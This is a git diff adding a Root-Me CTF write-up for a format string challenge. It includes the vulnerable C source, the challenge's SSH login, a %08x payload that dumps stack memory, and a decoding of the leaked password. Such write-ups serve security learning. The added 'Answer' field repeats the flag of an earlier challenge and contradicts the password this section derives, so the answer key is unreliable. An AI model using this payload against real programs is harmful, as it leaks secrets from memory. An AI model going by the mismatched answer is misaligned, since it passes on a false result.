@@ -7,7 +7,7 @@ These challenges will help you understand applicative vulnerabilities.
 1. [ELF x86 - Stack buffer overflow basic 1](#elf-x86-stack-buffer-overflow-basic-1) 🗸
 2. [ELF x86 - Stack buffer overflow basic 2](#elf-x86-stack-buffer-overflow-basic-2) 🗸
 3. [PE32 - Stack buffer overflow basic](#pe32-stack-buffer-overflow-basic)
-4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1)
+4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1) 🗸
 5. [ELF x64 - Stack buffer overflow - basic](#elf-x64-stack-buffer-overflow-basic)
 6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2)
 7. [ELF x86 - Race condition](#elf-x86-race-condition)
@@ -453,6 +453,102 @@ B33r1sSoG0oD4y0urBr4iN
 
 ---
 
-Last updated Jan 2021.
+## ELF x86 Format string bug basic 1
+
+- Author: Lu33Y
+- Date: 8 February 2012
+- Points: 15
+- Level: 2
+
+### Statement
+     
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+    #include <stdio.h>
+    #include <unistd.h>
+     
+    int main(int argc, char *argv[]){
+            FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
+            char buffer[32];
+            fgets(buffer, sizeof(buffer), secret);
+            printf(argv[1]);
+            fclose(secret);
+            return 0;
+    }
+
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port:2222
+- SSH access: ssh -p 2222 app-systeme-ch5@challenge02.root-me.org 
+- Username: app-systeme-ch5
+- Password: app-systeme-ch5
+
+### Resources
+
+1. [Format Bugs - Exploiting format string](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20Bugs%20-%20Exploiting%20format%20string.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+This is a simple string buffer exploit.  By re-formatting the input string we can print memory values:
+
+~~~shell
+$ ./ch5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+00000020.0804b160.0804853d.00000009.bffffd1f.b7e1b679.bffffbe4.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b
+~~~
+
+We can decode into ascii and get the following string:
+    
+~~~
+0x000000200804b1600804853d00000009bffffd1fb7e1b679bffffbe4b7fc3000b7fc30000804b16039617044282936646d617045bf000a640804861b
+??? ??±`???=???\t¿ÿý?·á¶y¿ÿûä·ü0?·ü0???±`9apD()6dmapE¿?d?
+~~~
+
+This is little-endian, we can thus invert the string to recover the solution:
+
+~~~
+??? ??±`???=???\t¿ÿý?·á¶y¿ÿûä·ü0?·ü0???±`9apD()6dmapE¿?d?
+ ???`±??=???\t????ýÿ¿y¶á·äûÿ¿?0ü·?0ü·`±??Dpa9d6)(Epam?d?¿
+~~~
+
+The solution will be the only printable string in the above:
+
+~~~
+Dpa9d6)(Epamd
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+B33r1sSoG0oD4y0urBr4iN
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---    
+
+Last updated April 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
